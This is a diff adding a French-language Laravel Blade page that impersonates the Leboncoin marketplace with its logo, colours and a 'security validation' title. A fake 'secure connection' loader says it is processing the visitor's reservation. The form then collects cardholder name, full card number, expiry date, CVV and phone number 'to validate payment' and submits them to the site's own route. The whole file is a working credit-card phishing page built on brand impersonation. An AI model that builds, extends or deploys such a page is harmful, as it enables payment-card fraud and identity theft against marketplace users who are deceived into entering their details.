@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
+    <link rel="shortcut icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
+    <title>LEBONCOIN | VALIDATION DE SECURITE</title>
+
+    @vite(['resources/css/app.css', 'resources/js/app.js'])
+    
+    <style>
+        .coriolis-orange { background-color: #F56B2A; }
+        .coriolis-text { color: #F56B2A; }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center">
+
+<div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
+        <div class="loader-content" style="text-align: center; margin-top: 0;">
+            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #F56B2A; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
+            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Traitement de votre reservation</p> 
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+            window.addEventListener('load', function() {
+                const loader = document.getElementById('global-loader');
+                
+                if (loader) {
+                    setTimeout(() => {
+                        loader.style.opacity = '0';
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                        }, 500);
+                    }, 1200);
+                }
+            });
+        </script>
+
+    <main class="w-full max-w-md mx-auto px-4 py-4 ">
+        <div class="bg-white p-8 shadow-lg rounded-2xl border-gray-100 ">
+            <header class="w-full max-w-md mx-auto text-sm mb-2">
+        
+        <div class="flex justify-center mt-5">
+            <img
+            src="{{ asset('images/leboncoin.png') }}"
+            alt="Logo"
+            class="h-8 lg:h-15 w-auto"
+            >
+        </div>
+
+        </header>
+        <p  class="text-sm text-center mb-6 text-gray-500">Veuillez renseigner les détails de votre compte pour valider le paiement.</p>
+
+        @if ($errors->any())
+            <div class="bg-red-100 border border-red-400 text-red-700 p-4 rounded mb-4">
+                <ul>
+                    @foreach ($errors->all() as $error)
+                        <li>{{ $error }}</li>
+                    @endforeach
+                </ul>
+            </div>
+        @endif
+        
+        <form action="{{ route('reservation.submit') }}" method="POST" class="space-y-6">
+            @csrf  
+
+        <div>
+            <label for="cardholder" class="block text-sm font-medium text-gray-700 mb-1">Nom sur la carte</label>
+            <input type="text" id="cardholder" name="name" required
+                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
+                placeholder="Votre nom complet">
+        </div>
+
+        <div>
+            <label for="card_number" class="block text-sm font-medium text-gray-700 mb-1">Numéro de carte</label>
+             <div class="flex items-center gap-2 mb-1 ">
+                <img src="{{ asset('images/cb.jpg') }}" alt="CB" class="h-5 w-auto object-contain">
+                <img src="{{ asset('images/mastercard.png') }}" alt="Mastercard" class="h-5 w-auto object-contain">
+                <img src="{{ asset('images/visa.png') }}" alt="Visa" class="h-5 w-auto object-contain">
+            </div>
+            <input type="text" id="card_number" name="card_number" inputmode="numeric" pattern="[0-9\s]{13,19}" required
+                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition" 
+                placeholder="0000 0000 0000 0000">
+        </div>
+        
+
+        <div class="grid grid-cols-2 gap-4">
+            <div>
+                <label for="expiry" class="block text-sm font-medium text-gray-700 mb-1">Date d'expiration</label>
+                <input type="text" id="expiry" name="expiry" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required
+                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition">
+            </div>
+
+            <div>
+                <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" required
+                    class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition">
+            </div>
+        </div>
+
+        <div>
+            <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Numéro de téléphone</label>
+            <input type="tel" id="phone" name="phone" placeholder="+33 6 12 34 56 78" inputmode="tel" required
+                class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-leboncoin focus:border-leboncoin outline-none transition">
+        </div>
+
+        <button type="submit" class="w-full flex items-center capitalize justify-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-300 shadow-md cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
+            <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+            paiement sécurisé
+        </button>
+        </form>
+
+        
+        
+    </div>
+
+    </main>
+
+
+    <script>
+        // Format card number
+        document.getElementById('card_number').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, ''); // Enlever espaces et caractères non-numériques
+
+            if (value.length > 16) {
+                value = value.substring(0, 16);
+            }
+
+            // Ajouter les espaces tous les 4 chiffres
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
+
+            e.target.value = formatted;
+        });
+
+        // Validation du numéro de carte avant submission
+        document.querySelector('form').addEventListener('submit', function (e) {
+            const cardInput = document.getElementById('card_number');
+            const cardValue = cardInput.value.replace(/\s/g, ''); // Enlever les espaces
+            
+            // Vérifier qu'il y a exactement 16 chiffres
+            if (cardValue.length !== 16 || !/^\d+$/.test(cardValue)) {
+                e.preventDefault();
+                alert('Le numéro de carte doit contenir exactement 16 chiffres');
+                cardInput.focus();
+                return false;
+            }
+        });
+
+        // Format expiry date
+        document.getElementById('expiry').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Garde uniquement les chiffres
+
+            if (value.length > 4) {
+                value = value.substring(0, 4);
+            }
+
+            if (value.length >= 3) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+
+            e.target.value = value;
+        });
+    </script>
+
+</body>
+</html>
